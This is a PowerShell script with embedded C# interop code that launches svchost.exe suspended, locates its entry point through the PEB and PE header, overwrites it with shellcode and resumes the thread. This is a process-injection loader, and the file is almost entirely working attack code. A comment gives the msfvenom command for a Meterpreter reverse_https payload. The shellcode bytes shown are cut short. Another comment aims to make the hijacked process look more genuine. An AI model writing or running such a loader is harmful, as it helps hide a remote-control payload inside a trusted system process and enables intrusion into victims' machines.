Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX;
    public uint dwY;
    public uint dwXSize;
    public uint dwYSize;
    public uint dwXCountChars;
    public uint dwYCountChars;
    public uint dwFillAttribute;
    public uint dwFlags;
    public short wShowWindow;
    public short cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}

[StructLayout(LayoutKind.Sequential)]
public struct SECURITY_ATTRIBUTES
{
    public int length;
    public IntPtr lpSecurityDescriptor;
    public bool bInheritHandle;
}

// Structure for PROCESS_BASIC_INFORMATION used by ZwQueryInformationProcess
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}

public static class Kernel32
{
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}

public static class ntdll
{
    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen,
        ref uint retlen
    );
}
"@

# Setup security attributes
$SecAttr = New-Object SECURITY_ATTRIBUTES
$SecAttr.length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)

# Setup startup information
$StartupInfo = New-Object STARTUPINFO
$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)

# Process information structure
$ProcessInfo = New-Object PROCESS_INFORMATION

# Define the application and arguments
$Binary = "C:\Windows\System32\svchost.exe"
$Args = $null

# Get current directory path
# Should look to change this to the real original directory of the process to look more genuine
$CurrentPath = (Get-Item -Path ".\" -Verbose).FullName

# Call CreateProcess
[Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, 0x4, [IntPtr]::Zero, $CurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) | Out-Null

# Initialize PROCESS_BASIC_INFORMATION structure
$bi = New-Object PROCESS_BASIC_INFORMATION
$tmp = [UInt32]0
$hProcess = $ProcessInfo.hProcess

# Query process information to get the PEB address of the process
[ntdll]::ZwQueryInformationProcess($hProcess, 0, [ref] $bi, [UInt32]([System.IntPtr]::Size * 6), [ref] $tmp) | Out-Null
$ptrToImageBase = [IntPtr]([Int64]$bi.PebAddress + 0x10)

# Read the memory to get the base address of the executable
[byte[]] $addrBuf = New-Object byte[] ([IntPtr]::Size)
[IntPtr]$nRead = [IntPtr]::Zero

$readSuccess = [Kernel32]::ReadProcessMemory($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.Length, [ref] $nRead)

# Calculate the base address of svchost.exe
$svchostBase = [IntPtr]::Zero
if ([IntPtr]::Size -eq 8) {
    $svchostBase = [IntPtr]::new([System.BitConverter]::ToInt64($addrBuf, 0))
} else {
    $svchostBase = [IntPtr]::new([System.BitConverter]::ToInt32($addrBuf, 0))
}

# Convert svchostBase to UInt64 for entry point calculation
$svchostBase64 = [UInt64]$svchostBase.ToInt64()

# Read more memory to locate the entry point
[byte[]] $data = New-Object byte[] 0x200
[Kernel32]::ReadProcessMemory($hProcess, $svchostBase, $data, $data.Length, [ref] $nRead) | Out-Null

# Get the entry point of the executable
$e_lfanew_offset = [BitConverter]::ToUInt32($data, 0x3C)
$opthdr = $e_lfanew_offset + 0x28
$entrypoint_rva = [BitConverter]::ToUInt32($data, [int]$opthdr)

# Calculate the address of the entry point
$addressOfEntryPoint = [IntPtr]::new($entrypoint_rva + $svchostBase64)

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread -o buff.txt
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4

# Write the shellcode to the entry point of the executable
[Kernel32]::WriteProcessMemory($hProcess, $addressOfEntryPoint, $buf, $buf.Length, [ref] $nRead) | Out-Null

# Resume the main thread of the process
[Kernel32]::ResumeThread($ProcessInfo.hThread) | Out-Null

# Clean up resources
[Kernel32]::CloseHandle($ProcessInfo.hProcess) | Out-Null
[Kernel32]::CloseHandle($ProcessInfo.hThread) | Out-Null
